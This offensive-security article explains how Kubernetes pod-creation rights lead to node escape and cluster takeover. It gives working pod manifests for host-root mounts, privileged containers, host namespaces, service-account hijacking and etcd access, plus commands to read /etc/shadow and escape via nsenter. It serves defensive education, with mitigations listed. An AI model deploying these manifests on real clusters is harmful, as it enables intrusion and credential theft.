---
title: Weaponizing Pod Creation Access
description: How pod creation permissions can be leveraged to escalate privileges and escape to the underlying node
category: offensive
createdAt: 2026-01-16
impact: An attacker with pod creation access can potentially gain node-level access, steal credentials, or achieve cluster-admin privileges
mitigation:
  - Restrict pod creation using Pod Security Admission
  - Use admission controllers to block dangerous pod configurations
mitreTechniques:
  - T1611
  - T1548
references: |
  - [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
  - [Configure a Security Context for a Pod](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
---

In Kubernetes, the ability to create pods is one of the most powerful permissions an attacker can obtain. While it may seem like a basic workload operation, pod creation provides direct control over what runs on cluster nodes, including access to host resources, privileged capabilities, and service account tokens.

## Mounting the Host Filesystem

The most direct path to node compromise is mounting the host filesystem into a pod. With access to the host's root filesystem, an attacker can read sensitive files, modify system configurations, or inject malicious code.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: host-mount
spec:
  nodeName: worker-node-01  # Target specific node if known from enumeration
  containers:
    - name: shell
      image: busybox
      command: ["sleep", "infinity"]
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /
        type: Directory
```

If the attacker has enumerated the cluster and identified high-value targets (such as control plane nodes or nodes running sensitive workloads), they can use the **nodeName** field to deploy the malicious pod directly to that specific node.

Once the pod is running, the entire host filesystem is accessible at `/host`:

```bash
kubectl exec -it host-mount -- sh
cat /host/etc/shadow
```

Once a node is compromised, an attacker can often escalate to full cluster control.

## Privileged Container Breakout

A privileged container runs with all Linux capabilities and has access to host devices. This effectively removes the container isolation boundary.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
    - name: shell
      image: busybox
      command: ["sleep", "infinity"]
      securityContext:
        privileged: true
```

From a privileged container, an attacker gains access to host devices via `/dev`, can mount the host filesystem using `nsenter`, load kernel modules, and modify iptables rules. The most direct escape is through the `nsenter` command:

```bash
# From inside the privileged container
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

This command enters the host's namespaces via PID 1 (the init process), effectively escaping to the node.

## Exploiting Host Namespaces

Even without setting **privileged: true**, access to the host's PID or network namespace provides significant attack surface.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: host-pid-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: shell
      image: busybox
      command: ["sleep", "infinity"]
```

With **hostPID: true**, the container can see all processes on the node:

```bash
ps aux
```

This exposes process arguments that may contain secrets, environment variables, or other sensitive data. Combined with **hostNetwork: true**, the container shares the node's network stack, allowing access to services bound to localhost or node-specific network resources.

## Service Account Token Theft

Every pod has access to a service account token unless explicitly disabled. If an attacker knows or discovers a service account name in the namespace, they can create a pod using that account to inherit its permissions.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: steal-permissions
spec:
  serviceAccountName: jenkins-admin
  containers:
    - name: kubectl
      image: bitnami/kubectl
      command: ["sleep", "infinity"]
```

Once the pod is running, the attacker can explore the service account's permissions using `kubectl auth can-i --list`.

## Using nodeSelector to Target Control Plane

An attacker can target specific nodes, such as control plane nodes, using node selectors or tolerations.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: control-plane-pod
spec:
  nodeSelector:
    node-role.kubernetes.io/control-plane: ""
  tolerations:
    - key: "node-role.kubernetes.io/control-plane"
      operator: "Exists"
      effect: "NoSchedule"
  containers:
    - name: shell
      image: busybox
      command: ["sleep", "infinity"]
      volumeMounts:
        - name: etcd-data
          mountPath: /etcd
  volumes:
    - name: etcd-data
      hostPath:
        path: /var/lib/etcd
        type: Directory
```

> **Note:** In cloud-managed Kubernetes clusters (GKE, EKS, AKS), the control plane, etcd, and controller manager are fully managed by the provider and cannot be accessed or targeted by users.

This pod targets a control plane node and mounts the etcd data directory. **By default, Kubernetes does not enable encryption at rest for etcd**, meaning all cluster state including Secrets are stored in base64 encoding without encryption. An attacker with access to the etcd data directory can read all **Secrets**, **ConfigMaps**, and cluster configuration in plaintext. 

Even in clusters where encryption at rest has been manually enabled, an attacker with control plane filesystem access can locate and extract the encryption keys from the configuration file specified in the API server's `--encryption-provider-config` flag (the path and filename are entirely administrator-defined). Compromising etcd effectively grants complete control over the entire cluster.

## Chaining Techniques for Privilege Escalation

Attackers commonly chain these techniques together. A typical escalation path:

1. Create a pod with **hostPath** mount of `/` or `/var/lib/kubelet` to access the host filesystem
2. Use stolen high-privilege service account tokens to authenticate to the API server with elevated permissions
3. If the stolen token has sufficient RBAC permissions (like `create clusterrolebindings`), escalate to **cluster-admin** by creating privileged role bindings
4. Alternatively, search the host filesystem for kubeconfig files

The fundamental issue is that pod creation without admission control bypasses many security boundaries. Even with Pod Security Admission set to **baseline**, dangerous configurations like automatic service account token mounting and the ability to use high-privilege service accounts remain possible.